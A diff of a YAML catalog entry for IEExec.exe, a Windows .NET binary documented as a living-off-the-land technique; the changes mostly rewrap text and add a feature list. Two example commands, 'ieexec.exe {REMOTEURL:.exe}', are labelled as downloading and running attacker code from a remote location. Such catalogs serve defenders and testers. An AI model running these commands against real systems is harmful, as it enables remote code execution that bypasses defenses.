@@ -2,7 +2,10 @@
 id: windows-execution-ieexec
 namespace: windows:execution:ieexec
 name: ieexec
-description: 'The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe.'
+description: 'The IEExec.exe application is an undocumented Microsoft .NET Framework
+  application that is included with the .NET Framework. You can use the IEExec.exe
+  application as a host to run other managed applications that you start by using
+  a URL. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -43,7 +46,13 @@ resource_profile:
 allowed-tools:
 - ieexec
 parameters: []
-features: []
+features:
+- compression
+- file-system
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- process-manip
 execution:
   template: ieexec
   sandbox: execFile
@@ -51,9 +60,11 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads and executes executable from the remote server. (Download and run attacker code from remote location)
+- description: Downloads and executes executable from the remote server. (Download
+    and run attacker code from remote location)
   command: ieexec.exe {REMOTEURL:.exe}
-- description: Downloads and executes executable from the remote server. (Download and run attacker code from remote location)
+- description: Downloads and executes executable from the remote server. (Download
+    and run attacker code from remote location)
   command: ieexec.exe {REMOTEURL:.exe}
 references:
 - label: ''
@@ -82,7 +93,6 @@ install:
   commands:
   - choco install ieexec
 ---
-
 
 # ieexec
 
